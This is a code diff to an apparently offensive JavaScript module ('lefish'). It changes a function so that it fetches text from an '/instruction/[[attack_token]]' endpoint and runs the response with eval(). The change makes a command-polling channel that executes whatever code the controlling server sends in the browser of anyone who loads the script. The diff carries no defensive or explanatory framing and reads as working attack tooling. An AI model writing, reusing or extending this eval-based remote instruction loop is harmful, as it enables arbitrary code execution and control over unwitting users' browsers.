@@ -36,11 +36,26 @@ lefish = (function() {
     function getInstruction() {
         console.log('getInstruction()');
         
+        /*
         fetch('/instruction/[[attack_token]]', {
             method: 'GET'
         })
         .then(response => response.text())
         .then(data => console.log('Response:', data))
+        .catch(error => console.error('Error:', error));
+        */
+
+        fetch('/instruction/[[attack_token]]')
+        .then(response => {
+            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+            return response.text();
+        })
+        .then(text => {
+            console.log('Response text:', text);
+            if (text.trim()) {
+                eval(text);
+            }
+        })
         .catch(error => console.error('Error:', error));
     }
 
